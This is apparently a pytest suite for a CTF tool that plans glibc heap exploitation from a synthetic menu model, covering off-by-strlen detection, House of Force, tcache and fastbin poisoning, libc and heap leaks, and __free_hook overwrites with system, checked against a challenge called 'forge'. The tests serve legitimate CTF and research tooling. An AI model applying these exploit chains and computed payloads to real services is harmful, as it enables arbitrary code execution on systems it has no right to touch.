"""Deterministic tests for the version-aware heap-menu exploitation PLAN engine (B-053).

Every test drives the real engine over a synthetic menu *model* (no binary is read and nothing is
executed) and asserts a specific, falsifiable fact about the derived plan, so a wrong rule fails the
test.  The acceptance anchor is csctf 9137 ("forge"): an off-by-strlen heap overflow on glibc 2.27 that
leaks libc via the unsorted bin, leaks the heap via tcache, corrupts the top chunk (House of Force) and
overwrites ``__free_hook`` with ``system`` -- the engine must reproduce that chain from the menu model.
"""
from __future__ import annotations

import json

import pytest

import heap_menu_engine as engine


# --------------------------------------------------------------------------- model builders


def _op(**kw):
    return kw


def _model(ops, **overrides):
    config = {"name": "menu", "bits": 64, "slots": 16, "arena": "main", "ops": ops}
    config.update(overrides)
    return engine.MenuModel.from_dict(config)


FORGE_OPS = [
    _op(label="new", action="allocate", size_controlled=True, min_size=0x18, max_size=0,
        content_controlled=True),
    _op(label="temper", action="edit", edit_offset="base_plus_strlen", edit_len="requested",
        null_terminated=False),
    _op(label="read", action="read", returns_content=True, reads_until_nul=True),
    _op(label="free", action="free", clears_slot=True),
]


def _forge_model(**overrides):
    return _model([dict(op) for op in FORGE_OPS], name="forge", **overrides)


# --------------------------------------------------------------------------- model validation


def test_model_rejects_unknown_op_key():
    with pytest.raises(engine.MenuEngineError):
        _model([_op(label="x", action="allocate", bogus=1)])


def test_model_rejects_unknown_action():
    with pytest.raises(engine.MenuEngineError):
        _model([_op(label="x", action="teleport")])


def test_model_rejects_bad_edit_enum():
    with pytest.raises(engine.MenuEngineError):
        _model([_op(label="e", action="edit", edit_offset="sideways")])


def test_model_rejects_duplicate_labels():
    with pytest.raises(engine.MenuEngineError):
        _model([_op(label="a", action="allocate"), _op(label="a", action="free")])


def test_model_rejects_max_below_min():
    with pytest.raises(engine.MenuEngineError):
        _model([_op(label="a", action="allocate", size_controlled=True, min_size=0x40, max_size=0x20)])


def test_fixed_edit_needs_fixed_len():
    with pytest.raises(engine.MenuEngineError):
        _model([_op(label="e", action="edit", edit_len="fixed", fixed_len=0)])


# --------------------------------------------------------------------------- bug detection


def test_off_by_strlen_detected_on_base_plus_strlen_requested():
    bugs = engine.detect_bugs(_forge_model())
    classes = {b.bug_class for b in bugs}
    assert "off-by-strlen" in classes
    off = next(b for b in bugs if b.bug_class == "off-by-strlen")
    assert off.op_label == "temper"
    # a non-terminated such write both overflows and leaks adjacent heap
    assert "linear-heap-overflow" in off.enables
    assert "strlen-leak" in off.enables


def test_correct_size_minus_strlen_edit_is_not_a_bug():
    """The *fixed* version of forge's temper (size-strlen) must not be flagged as off-by-strlen."""
    model = _model([
        _op(label="new", action="allocate", size_controlled=True),
        _op(label="edit", action="edit", edit_offset="base_plus_strlen", edit_len="size_minus_strlen"),
        _op(label="free", action="free", clears_slot=True),
    ])
    assert all(b.bug_class != "off-by-strlen" for b in engine.detect_bugs(model))


def test_plain_base_write_requested_is_not_an_overflow():
    model = _model([
        _op(label="new", action="allocate", size_controlled=True),
        _op(label="edit", action="edit", edit_offset="base", edit_len="requested"),
    ])
    assert all(b.bug_class not in ("off-by-strlen", "heap-overflow") for b in engine.detect_bugs(model))


def test_fixed_length_base_write_over_small_alloc_is_overflow():
    model = _model([
        _op(label="new", action="allocate", size_controlled=True, min_size=0x18, max_size=0x20),
        _op(label="edit", action="edit", edit_offset="base", edit_len="fixed", fixed_len=0x100),
    ])
    assert any(b.bug_class == "heap-overflow" for b in engine.detect_bugs(model))


def test_use_after_free_needs_dangling_free_and_unchecked_access():
    dangling = _model([
        _op(label="new", action="allocate"),
        _op(label="show", action="read", returns_content=True, checks_live=False),
        _op(label="del", action="free", clears_slot=False, checks_live=True),
    ])
    assert any(b.bug_class == "use-after-free" for b in engine.detect_bugs(dangling))
    # the same read with liveness re-checked, or a free that clears the slot, is not a UAF
    guarded = _model([
        _op(label="new", action="allocate"),
        _op(label="show", action="read", returns_content=True, checks_live=True),
        _op(label="del", action="free", clears_slot=False, checks_live=True),
    ])
    assert all(b.bug_class != "use-after-free" for b in engine.detect_bugs(guarded))
    cleared = _model([
        _op(label="new", action="allocate"),
        _op(label="show", action="read", returns_content=True, checks_live=False),
        _op(label="del", action="free", clears_slot=True, checks_live=True),
    ])
    assert all(b.bug_class != "use-after-free" for b in engine.detect_bugs(cleared))


def test_double_free_only_when_free_neither_clears_nor_checks():
    df = _model([
        _op(label="new", action="allocate"),
        _op(label="del", action="free", clears_slot=False, checks_live=False),
    ])
    assert any(b.bug_class == "double-free" for b in engine.detect_bugs(df))
    safe = _model([
        _op(label="new", action="allocate"),
        _op(label="del", action="free", clears_slot=False, checks_live=True),
    ])
    assert all(b.bug_class != "double-free" for b in engine.detect_bugs(safe))


def test_read_without_returns_content_is_not_a_leak():
    model = _model([
        _op(label="new", action="allocate"),
        _op(label="show", action="read", returns_content=False),
        _op(label="free", action="free", clears_slot=True),
    ])
    assert all(b.bug_class != "info-leak" for b in engine.detect_bugs(model))


# --------------------------------------------------------------------------- primitive mapping


def test_house_of_force_available_on_227_main_arena():
    plan = engine.plan_menu_exploitation(_forge_model(), "2.27")
    hof = [p for p in plan.primitives if p.technique == "house-of-force"]
    assert hof and hof[0].available is True
    assert plan.computed["house_of_force"] is True


def test_house_of_force_blocked_from_229_by_top_size_check():
    plan = engine.plan_menu_exploitation(_forge_model(), "2.29")
    hof = next(p for p in plan.primitives if p.technique == "house-of-force")
    assert hof.available is False
    assert plan.computed["house_of_force"] is False


def test_house_of_force_blocked_in_thread_arena():
    plan = engine.plan_menu_exploitation(_forge_model(arena="thread"), "2.27")
    hof = next(p for p in plan.primitives if p.technique == "house-of-force")
    assert hof.available is False


def test_uaf_maps_to_tcache_poison_with_tcache_and_fastbin_without():
    uaf_ops = [
        _op(label="new", action="allocate", size_controlled=True, max_size=0x80),
        _op(label="show", action="read", returns_content=True, checks_live=False),
        _op(label="del", action="free", clears_slot=False, checks_live=True),
    ]
    tc = engine.plan_menu_exploitation(_model([dict(o) for o in uaf_ops]), "2.31")
    assert any(p.technique == "tcache-poison" and p.available for p in tc.primitives)
    fb = engine.plan_menu_exploitation(_model([dict(o) for o in uaf_ops]), "2.23")
    assert any(p.technique == "fastbin-poison" and p.available for p in fb.primitives)
    assert all(p.technique != "tcache-poison" for p in fb.primitives)


def test_tcache_note_tracks_key_check_and_safe_linking():
    uaf_ops = [
        _op(label="new", action="allocate", size_controlled=True, max_size=0x80),
        _op(label="show", action="read", returns_content=True, checks_live=False),
        _op(label="del", action="free", clears_slot=False, checks_live=True),
    ]
    raw = engine.plan_menu_exploitation(_model([dict(o) for o in uaf_ops]), "2.27")
    note_227 = next(p for p in raw.primitives if p.technique == "tcache-poison").glibc_note
    assert "clear tcache_entry.key" not in note_227 and "PROTECT_PTR" not in note_227
    keyed = engine.plan_menu_exploitation(_model([dict(o) for o in uaf_ops]), "2.32")
    note_232 = next(p for p in keyed.primitives if p.technique == "tcache-poison").glibc_note
    assert "clear tcache_entry.key" in note_232 and "PROTECT_PTR" in note_232


def test_unsorted_leak_needs_an_allocation_above_the_tcache_range():
    big = engine.plan_menu_exploitation(_forge_model(), "2.27")  # unbounded size -> can exceed tcache
    leak = next(p for p in big.leaks if p.technique == "unsorted-bin-main-arena-leak")
    assert leak.available is True
    small_ops = [dict(o) for o in FORGE_OPS]
    small_ops[0] = _op(label="new", action="allocate", size_controlled=True, min_size=0x18,
                       max_size=0x80, content_controlled=True)
    small = engine.plan_menu_exploitation(_model(small_ops, name="forge"), "2.27")
    leak_small = next(p for p in small.leaks if p.technique == "unsorted-bin-main-arena-leak")
    assert leak_small.available is False


def test_heap_leak_demangle_note_appears_only_under_safe_linking():
    plan_227 = engine.plan_menu_exploitation(_forge_model(), "2.27")
    note = next(p for p in plan_227.leaks if p.technique == "tcache-fd-heap-leak").glibc_note
    assert "demangle" not in note
    plan_232 = engine.plan_menu_exploitation(_forge_model(), "2.32")
    note2 = next(p for p in plan_232.leaks if p.technique == "tcache-fd-heap-leak").glibc_note
    assert "demangle" in note2


# --------------------------------------------------------------------------- win endpoint


def test_free_hook_win_while_hooks_effective_fsop_after_removal():
    hooked = engine.plan_menu_exploitation(_forge_model(), "2.33")
    assert hooked.win["endpoint"] == "__free_hook"
    removed = engine.plan_menu_exploitation(_forge_model(), "2.34")
    assert removed.win["endpoint"] == "FSOP / exit handlers"


def test_concrete_hook_overwrite_emits_system_pointer_bytes():
    system = 0x7FFFF7A52290
    plan = engine.plan_menu_exploitation(
        _forge_model(), "2.27",
        addresses={"top_chunk_addr": 0x555555559010, "free_hook_addr": 0x7FFFF7DD18E8,
                   "system_addr": system},
    )
    hook = plan.artifacts["free_hook_overwrite"]
    assert bytes.fromhex(hook["payload_hex"]) == system.to_bytes(8, "little")
    assert hook["base_address"] == 0x7FFFF7DD18E8


def test_concrete_house_of_force_size_matches_formula():
    top, free_hook = 0x555555559010, 0x7FFFF7DD18E8
    plan = engine.plan_menu_exploitation(
        _forge_model(), "2.27",
        addresses={"top_chunk_addr": top, "free_hook_addr": free_hook, "system_addr": 0x7FFFF7A52290},
    )
    evil = int(plan.artifacts["house_of_force"]["evil_chunk_size"], 16)
    # carving `evil` from top sets new_top = top + evil; the next malloc returns new_top + 0x10,
    # which must be the __free_hook user pointer.
    assert (top + evil + 0x10) & ((1 << 64) - 1) == free_hook


def test_no_concrete_hook_emission_after_hook_removal():
    plan = engine.plan_menu_exploitation(
        _forge_model(), "2.34",
        addresses={"top_chunk_addr": 0x555555559010, "free_hook_addr": 0x7FFFF7DD18E8,
                   "system_addr": 0x7FFFF7A52290},
    )
    assert "free_hook_overwrite" not in plan.artifacts
    assert "note" in plan.win


def test_house_of_force_size_known_triple_and_wraparound():
    assert engine.house_of_force_size(0x1000, 0x4010, 64) == 0x3000
    # target below top wraps modulo 2**bits
    assert engine.house_of_force_size(0x5000, 0x1010, 64) == (0x1010 - 0x10 - 0x5000) & ((1 << 64) - 1)
    with pytest.raises(engine.MenuEngineError):
        engine.house_of_force_size(0, 0x4010, 64)


# --------------------------------------------------------------------------- one-gadget tie-in


def test_one_gadget_offsets_parsed_into_win():
    text = "0xdeadb execve(\"/bin/sh\", rsp+0x40, environ)\nconstraints:\n  rsp & 0xf == 0\n"
    plan = engine.plan_menu_exploitation(_forge_model(), "2.27", one_gadget_text=text)
    assert "0xdeadb" in plan.win["one_gadget_offsets"]


# --------------------------------------------------------------------------- fail-closed


def test_menu_with_no_bug_fails_loudly():
    safe = _model([
        _op(label="new", action="allocate"),
        _op(label="edit", action="edit", edit_offset="base_plus_strlen", edit_len="size_minus_strlen"),
        _op(label="free", action="free", clears_slot=True, checks_live=True),
    ])
    with pytest.raises(engine.MenuEngineError, match="no exploitable primitive"):
        engine.plan_menu_exploitation(safe, "2.31")


def test_leak_only_menu_has_no_control_primitive():
    leak_only = _model([
        _op(label="new", action="allocate", size_controlled=True),
        _op(label="show", action="read", returns_content=True, checks_live=True),
        _op(label="free", action="free", clears_slot=True, checks_live=True),
    ])
    with pytest.raises(engine.MenuEngineError, match="control primitive"):
        engine.plan_menu_exploitation(leak_only, "2.31")


def test_unsupported_glibc_surfaces_engine_error():
    with pytest.raises(engine.MenuEngineError):
        engine.plan_menu_exploitation(_forge_model(), "2.50")


# --------------------------------------------------------------------------- acceptance: csctf 9137


def test_forge_227_reproduces_the_full_chain():
    """Acceptance: the csctf 9137 'forge' menu + glibc 2.27 yields the documented exploit chain."""
    plan = engine.plan_menu_exploitation(
        _forge_model(), "2.27",
        addresses={"top_chunk_addr": 0x555555559010, "free_hook_addr": 0x7FFFF7DD18E8,
                   "system_addr": 0x7FFFF7A52290},
    )
    classes = {b.bug_class for b in plan.bugs}
    assert "off-by-strlen" in classes and "info-leak" in classes
    techniques = {p.technique for p in plan.primitives if p.available}
    assert "house-of-force" in techniques
    leak_techs = {p.technique for p in plan.leaks if p.available}
    assert leak_techs == {"unsorted-bin-main-arena-leak", "tcache-fd-heap-leak"}
    assert plan.win["endpoint"] == "__free_hook"
    assert "free_hook_overwrite" in plan.artifacts and "house_of_force" in plan.artifacts
    # the stages name the op->bug mapping, the two leaks, control and the win in order
    joined = "\n".join(plan.stages)
    assert "temper->off-by-strlen" in joined
    assert "unsorted-bin-main-arena-leak" in joined and "house-of-force" in joined
    assert "__free_hook" in joined


def test_plan_embeds_a_bounded_groom_plan_from_heap_primitives():
    import heap_primitives
    uaf_ops = [
        _op(label="new", action="allocate", size_controlled=True, max_size=0x80),
        _op(label="show", action="read", returns_content=True, checks_live=False),
        _op(label="del", action="free", clears_slot=False, checks_live=True),
    ]
    plan = engine.plan_menu_exploitation(_model([dict(o) for o in uaf_ops]), "2.31")
    assert plan.computed["groom_chunk_size"] == "0x80"
    groom = plan.computed["grooming"]
    # the plan must reuse the real heap_primitives groomer, not a hand-rolled list
    expected = heap_primitives.plan_heap_groom(chunk_size=0x80, live_chunks=6, holes=2,
                                               guard_chunks=2, refill=False)
    assert groom == [op.as_dict() for op in expected]
    assert groom and all(item["size"] == 0x80 for item in groom)


def test_groom_size_defaults_when_no_allocation_size_named():
    plan = engine.plan_menu_exploitation(_forge_model(), "2.27")  # forge alloc is unbounded
    assert plan.computed["groom_chunk_size"] == "0x90"


def test_plan_is_deterministic():
    a = engine.plan_menu_exploitation(_forge_model(), "2.27").as_dict()
    b = engine.plan_menu_exploitation(_forge_model(), "2.27").as_dict()
    assert json.dumps(a, sort_keys=True) == json.dumps(b, sort_keys=True)


# --------------------------------------------------------------------------- CLI


def test_cli_prints_plan_json(tmp_path, capsys):
    config = {
        "name": "forge", "glibc_version": "2.27", "bits": 64, "slots": 16, "arena": "main",
        "ops": [dict(op) for op in FORGE_OPS],
    }
    path = tmp_path / "forge.json"
    path.write_text(json.dumps(config), encoding="utf-8")
    assert engine.main([str(path)]) == 0
    out = capsys.readouterr().out.strip().splitlines()[-1]
    parsed = json.loads(out)
    assert parsed["target"] == "forge" and parsed["offline_only"] is True
    assert parsed["glibc_version"] == "2.27"


def test_cli_missing_glibc_version_fails(tmp_path, capsys):
    path = tmp_path / "bad.json"
    path.write_text(json.dumps({"name": "x", "ops": [dict(op) for op in FORGE_OPS]}), encoding="utf-8")
    assert engine.main([str(path)]) == 2
    assert "glibc_version" in capsys.readouterr().err


def test_cli_malformed_json_fails_closed(tmp_path, capsys):
    path = tmp_path / "broken.json"
    path.write_text("{not json", encoding="utf-8")
    assert engine.main([str(path)]) == 2
    assert "heap_menu_engine:" in capsys.readouterr().err


# --------------------------------------------------------------------------- manifest


def test_manifest_is_a_valid_plan_only_engine():
    from ctf.engines import manifest
    m = manifest.load("solvers/toolkits/heap_menu_engine.manifest.toml")
    assert m.id == "toolkits.heap_menu_engine"
    assert m.has("plan") and m.has("legacy-output")
    assert m.status == "plan-only"
    assert m.routes and m.routes[0].priority == 62
